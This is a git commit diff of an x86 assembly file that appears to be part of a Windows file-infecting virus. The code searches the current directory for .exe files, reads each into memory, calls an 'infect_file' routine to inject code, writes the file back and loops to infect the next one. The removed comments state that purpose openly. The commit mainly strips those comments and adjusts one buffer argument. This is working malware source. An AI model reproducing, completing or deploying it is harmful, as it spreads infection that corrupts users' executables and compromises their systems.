d97dd7c13dbbd9130cf604a847644600bdb7c1fe
letitbezh <963419670@qq.com>
2018-01-13 10:41:40 +0800

    Add files via upload

--- search_files.asm
+++ search_files.asm
@@ -31,101 +31,98 @@ ENDM
     push ecx
     lea  ecx, [ebx + file_regex]
     push ecx
-    call findfirstfile_addr     ; FindFirstFile(). Find file by regex. Regex is "*.exe".
+    call findfirstfile_addr    
     cmp  eax, INVALID_HANDLE_VALUE
     je   exit_search_exe
-    mov  filesearchhandle, eax  ; FindFirstFile returns a search handle to be used by FindNextFile for browsing the folder.
+    mov  filesearchhandle, eax  
 
 search_exe_loop:
 
-    push 0                      ; No template file
-    push 80h                    ; FILE_ATTRIBUTES_NORMAL
-    push 3                      ; ONLY_EXISTING (only if it exists)
-    push 0                      ; no security
-    push 0                      ; no sharing
-    push 0c0000000h             ; GENERIC_READ | GENERIC_WRITE
+    push 0                    
+    push 80h                   
+    push 3                     
+    push 0                     
+    push 0                     
+    push 0c0000000h           
     lea  ecx, win32finddata.cFileName;
-    push ecx                    ;
-    call createfile_addr        ; CreateFile()
+    push ecx                   
+    call createfile_addr       
     mov  filehandle, eax
     cmp  filehandle, -1
     je   open_failed
 
     push 0
     push filehandle
-    call getfilesize_addr       ; GetFileFize()
+    call getfilesize_addr      
     mov  filesize, eax
     cmp  eax, -1
     je   syserr
 
-    add  eax, 5000h             ; TODO: calculate size to allocate more properly.
+    add  eax, 5000h           
 
-    push 04h                    ; read/write permissions
-    push 00001000h              ; MEM_COMMIT
-    push eax                    ; size to allocate
-    push 0                      ; address. NULL == we want a new address
-    call virtualalloc_addr      ; VirtualAlloc()
+    push 04h                   
+    push 00001000h            
+    push eax                 
+    push 0                     
+    call virtualalloc_addr     
     mov  fileptr, eax
     cmp  eax, 0
     je   syserr
 
     push 0
-    lea  ecx, [esp - 4]
+    lea  ecx, dwRead
     push ecx
     push filesize
     push fileptr
     push filehandle
-    call readfile_addr          ; ReadFile(). Read all the file and put it in our buffer.
+    call readfile_addr         
     cmp  eax, 0
     je   syserr
 
-; --------------------------------------> OK guys, now we have our file mapped in memory. Let's inject some code !
 
-    invoke infect_file, fileptr, filesize, virtualalloc_addr, virtualfree_addr ; Procedure to properly inject our code into the file of interest. Returns new file size.
+    invoke infect_file, fileptr, filesize, virtualalloc_addr, virtualfree_addr 
     mov  filesize, eax
 
-    push 0                      ; 0 = from beginning of the file
-    push 0                      ; 0 = no high order DWORD for size to move
-    push 0                      ; size to move
+    push 0                     
+    push 0                     
+    push 0                     
     push filehandle
-    call setfilepointer_addr    ; SetFilePointer(). Move back to the beginning of the file
+    call setfilepointer_addr    
     cmp  eax, -1
     je   syserr
 
     push 0
-    lea  ecx, [esp - 4]
+    lea  ecx, dwRead
     push ecx
-; mov  ecx, filesize
-; add  ecx, 5000h               ; TODO: calculate size more properly
-; push ecx
+
     push filesize
     push fileptr
     push filehandle
-    call writefile_addr         ; WriteFile(). Write the buffer back to the file.
+    call writefile_addr        
 
     push filehandle
-    call closehandle_addr       ; We close the file because we are not pigs.
+    call closehandle_addr      
 
     push 08000h
     push 0
     push fileptr
     call virtualfree_addr
 
-; --------------------------------------> Now, we can look for another .exe file before looping.
+
 
 open_failed:
     lea  ecx, win32finddata
     push ecx
     push filesearchhandle
-    call findnextfile_addr      ; FindNextFile(): finds next file matching regex in current dir. Follows call to FindFirstFile.
+    call findnextfile_addr     
     cmp  eax, 0
-    je   exit_search_exe        ; FindNextFile returned 0, file not found. Time to leave the loop, as no more files were found.
+    je   exit_search_exe       
 
 syserr:
 
-    jmp  search_exe_loop        ; Loop to infect next file.
+    jmp  search_exe_loop       
 
 exit_search_exe:
 
 
-endif                           ; SEARCH_FILES_ASM_
+endif                          
